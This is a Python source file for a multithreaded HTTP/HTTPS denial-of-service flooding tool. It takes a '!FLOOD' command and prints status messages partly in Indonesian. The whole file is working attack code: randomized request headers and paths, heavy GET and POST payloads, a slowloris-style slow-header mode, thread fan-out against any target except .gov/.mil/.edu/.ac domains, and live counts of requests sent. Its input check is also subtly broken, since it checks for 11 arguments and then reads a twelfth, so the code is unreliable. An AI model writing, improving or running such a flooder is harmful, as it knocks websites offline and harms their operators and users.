import socket
import threading
import string
import random
import time
import os
import platform
import sys
import select
import ssl
import logging
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

stop_attack = threading.Event()
attack_stats = {"sent": 0, "errors": 0}

# Clear screen
def clear_text():
    os.system('cls' if platform.system().upper() == "WINDOWS" else 'clear')

# Generate random URL path
def generate_url_path_pyflooder(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    return "".join(random.sample(msg, int(num)))

def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    return ''.join(random.choice(letter) for _ in range(int(num)))

# Generate random headers
def generate_random_headers():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    ]
    return {
        "User-Agent": random.choice(user_agents),
        "Referer": f"http://{''.join(random.choices(string.ascii_lowercase, k=10))}.com",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive",
    }

# Generate random POST body
def generate_post_body(size=1000):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

# Attack logic
def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet, protocol):
    global attack_stats
    if stop_attack.is_set():
        return
    url_path = generate_url_path_pyflooder(10) if random.choice(['PY_FLOOD', 'CHOICES_FLOOD']) == "PY_FLOOD" else generate_url_path_choice(10)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Wrap socket with SSL for HTTPS
        if protocol == "https":
            context = ssl.create_default_context()
            s = context.wrap_socket(s, server_hostname=host)
            port = port if port != 80 else 443  # Default to 443 for HTTPS

        headers = generate_random_headers()
        payload_patterns = {
            'PY': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n" + \
                  ''.join(f"{k}: {v}\r\n" for k, v in headers.items()) + "\r\n",
            'HEAVY': f"{type_attack} /{url_path}?{'&'.join(f'q{i}={generate_post_body(100)}' for i in range(10))} HTTP/1.1\r\nHost: {host}\r\n" + \
                     ''.join(f"{k}: {v}\r\n" for k, v in headers.items()) + "\r\n",
            'POST': f"POST /{url_path} HTTP/1.1\r\nHost: {host}\r\n" + \
                    ''.join(f"{k}: {v}\r\n" for k, v in headers.items()) + \
                    f"Content-Length: {len(generate_post_body(2000))}\r\n\r\n{generate_post_body(2000)}",
            'SLOW': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n" + \
                    ''.join(f"{k}: {v}\r\n" for k, v in headers.items()) + "\r\n",
            'OWN1': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n",
            # Keep other OWN and TEST payloads as is
        }
        packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['PY']).encode()
        s.connect((ip, port))
        s.settimeout(2)

        # For SLOW payload, send data slowly
        if data_type_loader_packet == 'SLOW':
            s.send(f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n".encode())
            for k, v in headers.items():
                s.send(f"{k}: {v}\r\n".encode())
                time.sleep(0.1)
            s.send(b"\r\n")
            while not stop_attack.is_set():
                s.send(b"X-a: b\r\n")
                time.sleep(1)
        else:
            # Send multiple requests per connection with keep-alive
            for _ in range(booter_sent):
                if stop_attack.is_set():
                    break
                s.sendall(packet_data)
                attack_stats["sent"] += 1
                time.sleep(0.01)  # Small delay to avoid overwhelming local resources

    except Exception as e:
        attack_stats["errors"] += 1
        logger.error(f"Error in attack: {e}")
    finally:
        s.close()

def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet, protocol, max_threads):
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        while time.time() < time_loader and not stop_attack.is_set():
            futures = [
                executor.submit(DoS_Attack, ip, host, port_loader, methods_loader, booter_sent, data_type_loader_packet, protocol)
                for _ in range(min(spam_loader, max_threads))
            ]
            for future in futures:
                future.result()

# Validate input
def validate_input(args_get):
    if len(args_get) != 11:
        return False, "Format: !FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> <SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> <HTTP_METHODS> <SPAM_CREATE> <MAX_THREADS> <PROTOCOL>"
    try:
        port = int(args_get[3])
        time = int(args_get[4])
        spam_thread = int(args_get[5])
        create_thread = int(args_get[6])
        booter_sent = int(args_get[7])
        spam_create = int(args_get[9])
        max_threads = int(args_get[10])
        protocol = args_get[11].lower()
        if not (1 <= port <= 65535):
            return False, "Port harus antara 1-65535"
        if time <= 0:
            return False, "Waktu harus positif"
        if any(x <= 0 for x in [spam_thread, create_thread, booter_sent, spam_create, max_threads]):
            return False, "Semua parameter thread/paket harus positif"
        if protocol not in ["http", "https"]:
            return False, "Protokol harus 'http' atau 'https'"
        return True, ""
    except ValueError:
        return False, "Parameter numerik harus berupa angka"

# Countdown + interrupt
def countdown_timer(time_loader):
    global attack_stats
    remaining = int(time_loader - time.time())
    while remaining > 0 and not stop_attack.is_set():
        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds | Sent: {attack_stats['sent']} | Errors: {attack_stats['errors']}{Fore.RESET}")
        sys.stdout.flush()
        if sys.stdin in select.select([sys.stdin], [], [], 1)[0]:
            _ = sys.stdin.readline()
            stop_attack.set()
            print(f"\n{Fore.RED}Serangan Dihentikan{Fore.RESET}")
            print(f"{Fore.CYAN}Statistik: {attack_stats['sent']} permintaan terkirim, {attack_stats['errors']} error{Fore.RESET}")
            return
        time.sleep(1)
        remaining = int(time_loader - time.time())
    if not stop_attack.is_set():
        print(f"\n{Fore.GREEN}Serangan Selesai{Fore.RESET}")
        print(f"{Fore.CYAN}Statistik: {attack_stats['sent']} permintaan terkirim, {attack_stats['errors']} error{Fore.RESET}")
        stop_attack.set()

# Exit confirm
def confirm_exit():
    while True:
        choice = input(f"{Fore.YELLOW}Mau keluar? (y/n): {Fore.RESET}").lower()
        if choice == 'y':
            print(f"{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
            sys.exit(0)
        elif choice == 'n':
            print()
            return

# MAIN COMMAND LOOP
def command():
    global stop_attack, attack_stats
    while True:
        try:
            data_input_loader = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ")
            if not data_input_loader:
                confirm_exit()
                continue
            args_get = data_input_loader.split(" ")
            if args_get[0].lower() == "clear":
                clear_text()
            elif args_get[0].upper() == "!FLOOD":
                valid, error_msg = validate_input(args_get)
                if not valid:
                    print(f"{Fore.RED}{error_msg}{Fore.RESET}")
                    continue
                data_type_loader_packet = args_get[1].upper()
                target_loader = args_get[2]
                port_loader = int(args_get[3])
                time_loader = time.time() + int(args_get[4])
                spam_loader = int(args_get[5])
                create_thread = min(int(args_get[6]), 50)
                booter_sent = int(args_get[7])
                methods_loader = args_get[8]
                spam_create_thread = min(int(args_get[9]), 50)
                max_threads = min(int(args_get[10]), 50)
                protocol = args_get[11].lower()
                host = ''
                ip = ''
                try:
                    host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0]
                    if any(x in host for x in ['.gov', '.mil', '.edu', '.ac']):
                        print(f"{Fore.GREEN}Uhh You Can't Attack This Website {Fore.WHITE}[ {Fore.YELLOW}.gov .mil .edu .ac {Fore.WHITE}] . . .{Fore.RESET}")
                        continue
                    ip = socket.gethostbyname(host)
                except socket.gaierror:
                    print(f"{Fore.YELLOW}FAILED TO GET URL . . .{Fore.RESET}")
                    continue
                stop_attack.clear()
                attack_stats = {"sent": 0, "errors": 0}
                print(f"{Fore.LIGHTCYAN_EX}Serangan Dimulai\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}\nProtocol: {protocol.upper()}{Fore.RESET}")
                for _ in range(create_thread):
                    for _ in range(spam_create_thread):
                        threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet, protocol, max_threads)).start()
                countdown_timer(time_loader)
                continue
            else:
                print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHTRED_EX}Not found command{Fore.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
            stop_attack.set()
            sys.exit(0)

if __name__ == "__main__":
    try:
        command()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
        stop_attack.set()
        sys.exit(0)
